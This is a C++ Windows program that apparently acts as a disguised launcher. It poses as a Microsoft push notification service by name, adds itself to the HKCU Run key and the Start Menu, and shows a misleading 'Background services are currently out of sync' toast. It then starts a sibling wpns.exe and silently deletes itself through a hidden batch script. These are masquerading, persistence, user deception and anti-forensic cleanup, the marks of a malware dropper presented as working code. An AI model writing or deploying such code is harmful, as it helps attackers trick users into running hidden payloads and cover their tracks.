#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <string>
#include <shlobj.h>
#include <propvarutil.h>
#include <propkey.h>
#include <shlwapi.h>
#include <thread>
#include <atomic>
#include <tlhelp32.h>
#include <fstream>

#include <wrl.h>
#include <wrl/wrappers/corewrappers.h>
#include <windows.ui.notifications.h>
#include <windows.data.xml.dom.h>
#include <windows.foundation.h>

#pragma comment(lib, "runtimeobject.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "propsys.lib")

using namespace Microsoft::WRL;
using namespace Microsoft::WRL::Wrappers;
using namespace ABI::Windows::UI::Notifications;
using namespace ABI::Windows::Data::Xml::Dom;
using namespace ABI::Windows::Foundation;

const wchar_t* AUMID = L"Microsoft.Windows.PushNotificationService";
const char* REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const char* REGISTRY_VALUE = "WindowsPushNotificationSync";

std::atomic<bool> g_wpnsStarted{ false };

void RemoveFromStartup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, REGISTRY_VALUE);
        RegCloseKey(hKey);
    }
}

void DeleteStartupShortcut() {
    PWSTR startMenuPath;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Programs, 0, NULL, &startMenuPath))) {
        std::wstring shortcutPath = std::wstring(startMenuPath) + L"\\WindowsNotificationService.lnk";
        if (PathFileExistsW(shortcutPath.c_str())) {
            DeleteFileW(shortcutPath.c_str());
        }
        CoTaskMemFree(startMenuPath);
    }
}

void AddToStartup() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, REGISTRY_VALUE, 0, REG_SZ, (BYTE*)exePath, (DWORD)strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

bool IsWPNSRunning() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"wpns.exe") == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return false;
}

bool StartWPNS() {
    if (g_wpnsStarted.exchange(true)) return false;

    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    std::string fullPath(buffer);

    size_t lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash == std::string::npos) {
        g_wpnsStarted = false;
        return false;
    }

    std::string dirPath = fullPath.substr(0, lastSlash);
    std::string wpnsPath = dirPath + "\\wpns.exe";

    DWORD fileAttrib = GetFileAttributesA(wpnsPath.c_str());
    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
        g_wpnsStarted = false;
        return false;
    }

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    char cmdLineBuffer[MAX_PATH];
    sprintf_s(cmdLineBuffer, MAX_PATH, "\"%s\"", wpnsPath.c_str());

    BOOL created = CreateProcessA(
        wpnsPath.c_str(),
        cmdLineBuffer,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        dirPath.c_str(),
        &si,
        &pi
    );

    if (created) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    else {
        sprintf_s(cmdLineBuffer, MAX_PATH, "%s", wpnsPath.c_str());
        created = CreateProcessA(
            NULL,
            cmdLineBuffer,
            NULL,
            NULL,
            FALSE,
            0,
            NULL,
            dirPath.c_str(),
            &si,
            &pi
        );

        if (created) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return true;
        }
        else {
            g_wpnsStarted = false;
            return false;
        }
    }
}

void SilentSelfDelete() {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    char batchPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batchPath);
    strcat_s(batchPath, "cleanup_notif.bat");

    std::ofstream batch(batchPath);
    if (batch.is_open()) {
        batch << "@echo off\n";
        batch << ":retry\n";
        batch << "timeout /t 1 /nobreak >nul 2>&1\n";
        batch << "del /F /Q \"" << selfPath << "\" >nul 2>&1\n";
        batch << "if exist \"" << selfPath << "\" goto retry\n";
        batch << "del /F /Q \"%~f0\" >nul 2>&1\n";
        batch.close();

        STARTUPINFOA si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi;

        char cmdLine[MAX_PATH];
        sprintf_s(cmdLine, "cmd.exe /c \"%s\"", batchPath);

        if (CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

HRESULT InstallShortcut() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    PWSTR startMenuPath;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Programs, 0, NULL, &startMenuPath);
    if (FAILED(hr)) return hr;

    std::wstring shortcutPath = std::wstring(startMenuPath) + L"\\WindowsNotificationService.lnk";
    CoTaskMemFree(startMenuPath);

    if (PathFileExistsW(shortcutPath.c_str())) {
        DeleteFileW(shortcutPath.c_str());
    }

    ComPtr<IShellLinkW> shellLink;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&shellLink));
    if (FAILED(hr)) return hr;

    shellLink->SetPath(exePath);
    wchar_t workingDir[MAX_PATH];
    wcscpy_s(workingDir, exePath);
    PathRemoveFileSpecW(workingDir);
    shellLink->SetWorkingDirectory(workingDir);

    ComPtr<IPropertyStore> propertyStore;
    hr = shellLink.As(&propertyStore);
    if (FAILED(hr)) return hr;

    PROPVARIANT pv;
    InitPropVariantFromString(AUMID, &pv);
    propertyStore->SetValue(PKEY_AppUserModel_ID, pv);
    PropVariantClear(&pv);
    propertyStore->Commit();

    ComPtr<IPersistFile> persistFile;
    shellLink.As(&persistFile);
    return persistFile->Save(shortcutPath.c_str(), TRUE);
}

bool ShowToast() {

    HRESULT hrCom = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    bool comInitializedHere = SUCCEEDED(hrCom);

    HRESULT hrWinRT = RoInitialize(RO_INIT_SINGLETHREADED);
    bool winrtInitializedHere = SUCCEEDED(hrWinRT);

    ComPtr<IXmlDocument> xmlDoc;
    HRESULT hr = RoActivateInstance(HStringReference(RuntimeClass_Windows_Data_Xml_Dom_XmlDocument).Get(), &xmlDoc);
    if (FAILED(hr)) {
        if (winrtInitializedHere) RoUninitialize();
        if (comInitializedHere) CoUninitialize();
        return false;
    }

    ComPtr<IXmlDocumentIO> xmlIO;
    hr = xmlDoc.As(&xmlIO);
    if (FAILED(hr)) {
        if (winrtInitializedHere) RoUninitialize();
        if (comInitializedHere) CoUninitialize();
        return false;
    }

    std::wstring xml = L"<toast duration='short'>"
        L"<visual><binding template='ToastGeneric'>"
        L"<text>Notification Sync</text>"
        L"<text>Background services are currently out of sync.</text>"
        L"</binding></visual>"
        L"<audio src='ms-winsoundevent:Notification.Default'/>"
        L"</toast>";

    hr = xmlIO->LoadXml(HStringReference(xml.c_str()).Get());
    if (FAILED(hr)) {
        if (winrtInitializedHere) RoUninitialize();
        if (comInitializedHere) CoUninitialize();
        return false;
    }

    ComPtr<IToastNotificationFactory> factory;
    hr = RoGetActivationFactory(HStringReference(RuntimeClass_Windows_UI_Notifications_ToastNotification).Get(), IID_PPV_ARGS(&factory));
    if (FAILED(hr)) {
        if (winrtInitializedHere) RoUninitialize();
        if (comInitializedHere) CoUninitialize();
        return false;
    }

    ComPtr<IToastNotification> toast;
    hr = factory->CreateToastNotification(xmlDoc.Get(), &toast);
    if (FAILED(hr)) {
        if (winrtInitializedHere) RoUninitialize();
        if (comInitializedHere) CoUninitialize();
        return false;
    }

    ComPtr<IToastNotificationManagerStatics> manager;
    hr = RoGetActivationFactory(HStringReference(RuntimeClass_Windows_UI_Notifications_ToastNotificationManager).Get(), IID_PPV_ARGS(&manager));
    if (FAILED(hr)) {
        if (winrtInitializedHere) RoUninitialize();
        if (comInitializedHere) CoUninitialize();
        return false;
    }

    ComPtr<IToastNotifier> notifier;
    hr = manager->CreateToastNotifierWithId(HStringReference(AUMID).Get(), &notifier);
    if (FAILED(hr)) {
        if (winrtInitializedHere) RoUninitialize();
        if (comInitializedHere) CoUninitialize();
        return false;
    }

    hr = notifier->Show(toast.Get());

    bool success = SUCCEEDED(hr);

    if (success) {
        Sleep(1000);
    }

    if (winrtInitializedHere) RoUninitialize();
    if (comInitializedHere) CoUninitialize();

    return success;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

    if (IsWPNSRunning()) {
        DeleteStartupShortcut();
        RemoveFromStartup();
        SilentSelfDelete();
        return 0;
    }

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    RoInitialize(RO_INIT_SINGLETHREADED);

    HRESULT shortcutResult = InstallShortcut();

    Sleep(2000);

    AddToStartup();

    Sleep(1000);

    while (true) {

        bool toastShown = ShowToast();

        if (toastShown) {

            Sleep(1500);

            StartWPNS();

            bool wpnsConfirmed = false;
            for (int i = 0; i < 10; i++) {
                Sleep(500);
                if (IsWPNSRunning()) {
                    wpnsConfirmed = true;
                    break;
                }
            }


            if (wpnsConfirmed) {
                
                DeleteStartupShortcut();
                RemoveFromStartup();
                RoUninitialize();
                CoUninitialize();
                SilentSelfDelete();
                return 0;
            }
            else {
                
                g_wpnsStarted = false;
                Sleep(300000); 
            }
        }
        else {
            
            Sleep(300000); 
        }
    }

    return 0;
}